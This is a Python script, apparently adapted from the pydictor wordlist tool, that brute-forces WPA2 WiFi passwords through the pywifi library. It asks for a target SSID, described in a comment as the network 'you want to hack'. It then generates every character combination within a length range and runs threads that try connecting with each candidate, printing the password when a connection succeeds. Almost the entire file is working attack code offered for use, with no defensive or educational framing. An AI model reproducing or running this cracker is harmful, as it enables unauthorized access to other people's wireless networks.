#!/usr/bin/env python
# coding:utf-8
#
"""
Copyright (c) 2016-2021 LandGrey (https://github.com/LandGrey/pydictor)
License: GNU GENERAL PUBLIC LICENSE Version 3
"""

from __future__ import unicode_literals

import string
import itertools
from lib.data.data import pystrs, pyoptions
from lib.fun.fun import finishprinter, countchecker, range_compatible, finalsavepath, fun_name

import argparse
import os
import os.path
import platform
import threading
import time

# Importing pywifi library
import pywifi
from pywifi import Profile
from pywifi import PyWiFi
from pywifi import const

# Change According to needs -->
# cient_ssid == name of the wifi which you want to hack
# path to already created brute force password file


client_ssid = input("ssid: ")
path_to_file = r"C:\Users\Admin\Desktop\programming\pydictor\results\keys.txt"

#######


# Setting the color combinations
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

try:
    # Interface information
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]  # for wifi we use index - 0

    ifaces.scan()  # check the card
    results = ifaces.scan_results()  # Obtain the results of the previous triggerred scan. A Profile list will be
    # returned.

    wifi = pywifi.PyWiFi()  # A Profile is the settings of the AP we want to connect to
    iface = wifi.interfaces()[0]

except:
    print("[-] Error system")

type = False


def main(ssid, password, number=1):
    profile = Profile()  # create profile instance
    profile.ssid = ssid  # name of client
    profile.auth = const.AUTH_ALG_OPEN  # auth algo
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
    profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
    print(ssid)
    for i in password:
        print("p", i)
        profile.key = i  # use generated password
        iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
        tmp_profile = iface.add_network_profile(profile)  # add new profile
        time.sleep(0.1)  # if script not working change time to 1 !!!!!!
        iface.connect(tmp_profile)  # trying to Connect
        time.sleep(0.35)  # 1s
        if ifaces.status() == const.IFACE_CONNECTED:  # checker
            time.sleep(1)
            print(BOLD, GREEN, '[*] Crack success!', RESET)
            print(BOLD, GREEN, '[*] password is ' + i, RESET)
            time.sleep(1)
            exit()
        else:
            print(RED, '[] Crack Failed using {}'.format(i))


# get the dictionary list
def getchars(type):
    flag = str(type)
    chars = []
    if type in pystrs.base_dic_type:
        if flag == pystrs.base_dic_type[0]:
            chars = string.digits
        elif flag == pystrs.base_dic_type[1]:
            chars = string.ascii_lowercase
        elif flag == pystrs.base_dic_type[2]:
            chars = string.ascii_uppercase
        elif flag == pystrs.base_dic_type[3]:
            chars = string.printable[:36]
        elif flag == pystrs.base_dic_type[4]:
            chars = string.digits + string.ascii_uppercase
        elif flag == pystrs.base_dic_type[5]:
            chars = string.ascii_letters
        elif flag == pystrs.base_dic_type[6]:
            chars = string.printable[:62]
        return chars


def get_base_dic(objflag):
    storepath = finalsavepath(fun_name())

    objflag = getchars(objflag)
    countchecker(len(objflag), pyoptions.minlen, pyoptions.maxlen)

    # global variable transfer local variable to improved speed
    buffer = []
    buffer_size = pyoptions.buffer_size
    head = pyoptions.head
    tail = pyoptions.tail
    crlf = pyoptions.CRLF
    encode_name = pyoptions.encode
    encode_fun = pyoptions.operator.get(encode_name)

    with open(storepath, "a") as f:
        for i in range_compatible(pyoptions.minlen, pyoptions.maxlen + 1):
            for item in itertools.product(objflag, repeat=i):
                if encode_name == "none":
                    buffer.append(head + "".join(item) + tail)
                else:
                    buffer.append(encode_fun(head + "".join(item) + tail))
                if len(buffer) == buffer_size:
                    threading.Thread(target=main,args=(client_ssid, buffer)).start()
                    buffer = []
        threading.Thread(target=main,args=(client_ssid, buffer)).start()

    finishprinter(storepath)
